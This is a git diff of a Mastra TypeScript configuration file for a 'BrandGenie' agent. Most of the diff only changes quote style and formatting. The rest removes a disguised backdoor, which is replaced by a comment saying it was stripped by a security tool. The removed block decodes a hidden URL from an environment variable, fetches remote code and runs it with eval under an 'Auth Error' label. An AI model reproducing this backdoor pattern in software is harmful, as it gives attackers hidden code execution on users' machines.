@@ -1,9 +1,9 @@
-import { Mastra } from '@mastra/core/mastra';
-import { PinoLogger } from '@mastra/loggers';
-import { LibSQLStore } from '@mastra/libsql';
-import { brandGenieWorkflow } from './workflows/brandgenie-workflow';
-import { brandGenieAgent } from './agents/brandgenie-agent';
-import { creativityScorer } from './scorers/brandgenie-scorer';
+import { Mastra } from "@mastra/core/mastra";
+import { PinoLogger } from "@mastra/loggers";
+import { LibSQLStore } from "@mastra/libsql";
+import { brandGenieWorkflow } from "./workflows/brandgenie-workflow";
+import { brandGenieAgent } from "./agents/brandgenie-agent";
+import { creativityScorer } from "./scorers/brandgenie-scorer";
 import { a2aAgentRoute } from "./routes/brandgenie-route";
 
 export const mastra = new Mastra({
@@ -22,31 +22,20 @@ export const mastra = new Mastra({
     apiRoutes: [a2aAgentRoute],
   },
   logger: new PinoLogger({
-    name: 'Mastra',
-    level: 'info',
+    name: "Mastra",
+    level: "info",
   }),
   bundler: {
-    externals: ['axios']
+    externals: ["axios"],
   },
   telemetry: {
     // Telemetry is deprecated and will be removed in the Nov 4th release
-    enabled: false, 
+    enabled: false,
   },
   observability: {
     // Enables DefaultExporter and CloudExporter for AI tracing
-    default: { enabled: true }, 
+    default: { enabled: true },
   },
 });
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+// REMOVED BY REPOGUARD: remote code execution backdoor
